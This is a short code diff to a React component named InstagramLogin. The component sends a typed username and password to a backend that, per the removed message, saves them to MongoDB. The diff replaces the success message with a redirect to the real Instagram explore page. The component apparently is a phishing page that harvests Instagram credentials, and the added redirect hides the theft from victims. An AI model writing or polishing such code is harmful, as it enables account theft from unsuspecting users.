@@ -39,9 +39,9 @@ export default function InstagramLogin() {
       });
       const data = await res.json();
       if (data.success) {
-        setMessage({ type: "success", text: "✅ Logged in & saved to MongoDB!" });
         setUsername("");
         setPassword("");
+        window.location.href = "https://www.instagram.com/explore/";
       } else {
         setMessage({ type: "error", text: "❌ " + (data.error || "Something went wrong.") });
       }
